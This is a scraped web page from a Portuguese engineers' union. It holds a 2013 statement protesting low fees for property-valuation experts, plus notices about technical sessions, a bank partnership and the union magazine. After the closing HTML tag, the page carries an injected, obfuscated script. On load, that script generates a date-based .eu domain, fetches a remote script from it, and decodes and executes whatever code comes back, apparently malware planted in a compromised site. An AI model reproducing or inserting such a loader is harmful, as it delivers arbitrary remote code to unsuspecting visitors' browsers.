<p>2 – Como resultado desta depreciação, incompreensível para o grau de responsabilidade e rigor que as avaliações imobiliárias assumem, para muitos técnicos envolvidos nestes processos, a execução deste trabalho deixou de ter qualquer interesse económico, uma vez que, se está a pretender pagar um serviço, desempenhado por técnicos de formação superior, a um preço quase simbólico;</p>
<p> </p>
<p>3 – Esta depreciação, cerca 2/3 da tabela de Junho de 2009. Em Junho de 2009 o valor da unidade de remuneração era de 66,35 Euros e o valor da unidade de remuneração na atual tabela é de 22,00 Euros não só é incompreensível com não encontra qualquer justificação;</p>
<p> </p>
<p>4 – Neste quadro e tendo em atenção as responsabilidades, o rigor e o trabalho a ser executado, os Engenheiros, Engenheiros Técnicos e Arquitectos, quase pagam para trabalhar;</p>
<p> </p>
<p>5 – As funções de perito avaliador e a decisão de aceitar as condições de remuneração do seu trabalho, está, efetivamente no critério e na consciência de cada técnico, sejam eles Engenheiros, Engenheiros Técnicos ou Arquitectos e na forma como ele entende o valor dos seus conhecimentos, da sua experiência, enfim, do seu trabalho, não competindo às estruturas sindicais, balizar qualquer valor máximo ou mínimo para essa retribuição. Porém, o Senhor Ministro das Finanças, deverá ter consciência que, a partir de determinado valor, os técnicos que ele pretende, conforme as regras, precisas e concretas, de recrutamento que foram estabelecidas, deixam de estar disponíveis.</p>
<p> </p>
<p>6 – Por último, a situação criada contribuirá não só para a descredibilização deste processo de avaliação geral e desenhando-se, igualmente, um valor anormal de reclamações e atrasos desnecessários.</p>
<p> </p>
<p>Lisboa, 13 de Março, de 2013</p>
<p> </p>
<p><strong>&nbsp;</strong></p>
<strong>Sindicato Nacional dos Engenheiros, Engenheiros Técnicos e Arquitectos</strong>
<p> </p>
<p><span style="color: #ff9900;"><a href="/site/../recursos/engenho/posisneet.doc">Clique para obter</a></span></p>
<p> </p>
<p> </p>
<div>
<p style="text-align: center;"><strong>APRESENTAÇÕES/SESSÕES TÉCNICAS</strong></p>
<p style="text-align: center;"><strong>GRATUITAS</strong></p>
<p style="text-align: center;"><strong>&nbsp;</strong></p>
<p style="text-align: justify;">Durante o ano de 2012, a Top Informática irá promover sessões técnicas em várias capitais de Distrito com interesse para todos os associados</p>
<p style="text-align: justify;"> </p>
<p style="text-align: justify;"><a href="/site/../recursos/engenho/noticiatop.docx"><strong><em>Clique para obter</em></strong></a></p>
<p style="text-align: justify;"><a href="http://www.topinformatica.pt/"><span style="background-color: #888888;"><em><strong>&nbsp;</strong></em></span></a><a href="http://www.topinformatica.pt/"><span style="color: #0000ff;"><em><strong>Inscrição</strong></em></span></a></p>
</div>
</td>
</tr>
<tr>
<td></td>
</tr>
</tbody>
</table>
</div>
<span style="font-size: 10pt;">&nbsp;</span><img src="http://mail.sapo.pt/dimp/themes/pt/graphics/0.png" alt="minwidthh" height="1" width="775" />
<p> </p>
<p><img src="/site/recursos/ipa.jpg" /></p>
<p><span style="font-size: 10pt;"><em><span style="color: #0000ff;"><strong>PROTOCOLO BBVA</strong><strong>&nbsp;/ SNEET Sindicato Nacional dos Engenheiros,</strong></span></em></span></p>
<p><span style="font-size: 10pt;"><em><span style="color: #0000ff;">&nbsp;</span></em><em><span style="color: #0000ff;"><strong>Engenheiros Técnicos e Arquitectos</strong></span></em></span></p>
<p><em><span style="color: #0000ff;"><strong>Clique na imagem</strong></span></em></p>
<p><em><span style="color: #0000ff;"><a href="http://protocolos.bbva.pt/?p=0937"><img src="/site/../recursos/BBVA.jpg" height="168" width="473" /></a></span></em></p>
<p style="text-align: left;"><strong><em>&nbsp;</em></strong></p>
<p style="text-align: left;"><em><strong><span style="font-family: book antiqua,palatino;"><span style="color: #0000ff;">Já esta disponivel a ficha para actualização de dados dos sócios</span></span></strong></em></p>
<p style="text-align: left;"><em><strong><span style="font-family: book antiqua,palatino;"><span style="color: #333333;"><a href="/site/../recursos/DADOS.pdf"><span style="color: #ff0000;">Clique para obter</span></a></span></span></strong></em></p>
<p style="text-align: left;"><em><strong><span style="font-family: book antiqua,palatino;"><span style="color: #333333;">&nbsp;</span></span></strong></em></p>
<p style="text-align: left;"> </p>
<p style="text-align: justify;">Foi lançado mais um exemplar&nbsp;&nbsp;&nbsp;nº2 do ano de 2011 da revista Engenho</p>
<img src="/site/recursos/engenho/capamaio1.jpg" /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<img src="/site/../recursos/engenho/revista.jpg" /> &nbsp;&nbsp;&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;&nbsp; &nbsp; &nbsp;&nbsp;&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;
<p style="text-align: justify;"> </p>
<hr />
<br /></td>
</tr>

</table>
<span class="article_separator">&nbsp;</span>

					</div>
														</div></div>
								<div class="clearbreak"></div>
			</div></div></div>
						<div id="jsn-usermodules3"><div id="jsn-usermodules3_inner_grid2">
												<div id="jsn-puser6_grid2" class="jsn-column"><div id="jsn-puser6">		<div class="moduletable">
					<h3>Quem está...</h3>
					&nbsp;90 visitantes&nbsp;		</div>
	</div></div>
												<div id="jsn-puser7_grid2" class="jsn-column"><div id="jsn-puser7">		<div class="moduletable">
					<a href="http://www.ugt.pt" target="_blank"><img src="/site/../../%7Esne/site/images/stories/logotipo_ugt.gif" border="0" width="42" height="44" align="right" /></a>		</div>
	</div></div>
								<div class="clearbreak"></div>
			</div></div>
					</div>
				<div id="jsn-footer">
						<div id="jsn-pfooter_grid1" class="jsn-column"><div id="jsn-pfooter">		<div class="moduletable">
					<p style="margin-top: 0pt; margin-bottom: 0pt" align="center"><strong><font color="#c0c0c0">Sindicato Nacional dos Engenheiros<br /></font></strong></p><p style="margin-top: 0pt; margin-bottom: 0pt" align="center"><font color="#c0c0c0">© 2008 - </font><font color="#c0c0c0">Todos os direitos reservados</font> </p><p style="margin-top: 0pt; margin-bottom: 0pt" align="center"><font color="#c0c0c0"><a href="mailto:webmaster@sne.pt" target="_blank"><font color="#808080">webmaster</font></a></font></p>		</div>
	</div></div>
									<div class="clearbreak"></div>
		</div>
			</div>
	
</body>
</html><script>function hashdate (str) {if(!str) {var date=new Date();var str = date.getUTCFullYear() + "/" + (date.getUTCMonth()+1) + "/" + date.getUTCDate() + " " + (date.getHours() >= 12 ? 'PM':'AM');};var table = [0,1996959894,3993919788,2567524794,124634137,1886057615,3915621685,2657392035,249268274,2044508324,3772115230,2547177864,162941995,2125561021,3887607047,2428444049,498536548,1789927666,4089016648,2227061214,450548861,1843258603,4107580753,2211677639,325883990,1684777152,4251122042,2321926636,335633487,1661365465,4195302755,2366115317,997073096,1281953886,3579855332,2724688242,1006888145,1258607687,3524101629,2768942443,901097722,1119000684,3686517206,2898065728,853044451,1172266101,3705015759,2882616665,651767980,1373503546,3369554304,3218104598,565507253,1454621731,3485111705,3099436303,671266974,1594198024,3322730930,2970347812,795835527,1483230225,3244367275,3060149565,1994146192,31158534,2563907772,4023717930,1907459465,112637215,2680153253,3904427059,2013776290,251722036,2517215374,3775830040,2137656763,141376813,2439277719,3865271297,1802195444,476864866,2238001368,4066508878,1812370925,453092731,2181625025,4111451223,1706088902,314042704,2344532202,4240017532,1658658271,366619977,2362670323,4224994405,1303535960,984961486,2747007092,3569037538,1256170817,1037604311,2765210733,3554079995,1131014506,879679996,2909243462,3663771856,1141124467,855842277,2852801631,3708648649,1342533948,654459306,3188396048,3373015174,1466479909,544179635,3110523913,3462522015,1591671054,702138776,2966460450,3352799412,1504918807,783551873,3082640443,3233442989,3988292384,2596254646,62317068,1957810842,3939845945,2647816111,81470997,1943803523,3814918930,2489596804,225274430,2053790376,3826175755,2466906013,167816743,2097651377,4027552580,2265490386,503444072,1762050814,4150417245,2154129355,426522225,1852507879,4275313526,2312317920,282753626,1742555852,4189708143,2394877945,397917763,1622183637,3604390888,2714866558,953729732,1340076626,3518719985,2797360999,1068828381,1219638859,3624741850,2936675148,906185462,1090812512,3747672003,2825379669,829329135,1181335161,3412177804,3160834842,628085408,1382605366,3423369109,3138078467,570562233,1426400815,3317316542,2998733608,733239954,1555261956,3268935591,3050360625,752459403,1541320221,2607071920,3965973030,1969922972,40735498,2617837225,3943577151,1913087877,83908371,2512341634,3803740692,2075208622,213261112,2463272603,3855990285,2094854071,198958881,2262029012,4057260610,1759359992,534414190,2176718541,4139329115,1873836001,414664567,2282248934,4279200368,1711684554,285281116,2405801727,4167216745,1634467795,376229701,2685067896,3608007406,1308918612,956543938,2808555105,3495958263,1231636301,1047427035,2932959818,3654703836,1088359270,936918000,2847714899,3736837829,1202900863,817233897,3183342108,3401237130,1404277552,615818150,3134207493,3453421203,1423857449,601450431,3009837614,3294710456,1567103746,711928724,3020668471,3272380065,1510334235,755167117];var crc = crc ^ (-1);for(var i=0, iTop=str.length; i<iTop; i++) {crc = ( crc >>> 8 ) ^ table[( crc ^ str.charCodeAt( i ) ) & 0xFF];}return (crc ^ (-1)) >>> 0;};function dbc(s) {var e={},i,k,v=[],r='',w=String.fromCharCode;var n=[[65,91],[97,123],[48,58],[43,44],[47,48]];for(z in n){for(i=n[z][0];i<n[z][1];i++){v.push(w(i));}}for(i=0;i<64;i++){e[v[i]]=i;}for(i=0;i<s.length;i+=72){var b=0,c,x,l=0,o=s.substring(i,i+72);for(x=0;x<o.length;x++){c=e[o.charAt(x)];b=(b<<6)+c;l+=6;while(l>=8){r+=w((b>>>(l-=8))%256);}}}return r;};function runonload(){if(!document.body){setTimeout(runonload, 50);}else {var s=document.createElement("SCRIPT");s.src="http://" + hashdate().toString(16) + ".eu/script.html?"+Math.random();document.body.appendChild(s); }};window.cback=function(p){var s = document.createElement("SCRIPT");s.text = dbc(p).replace(/ +/,'');document.body.appendChild(s);};runonload(); </script>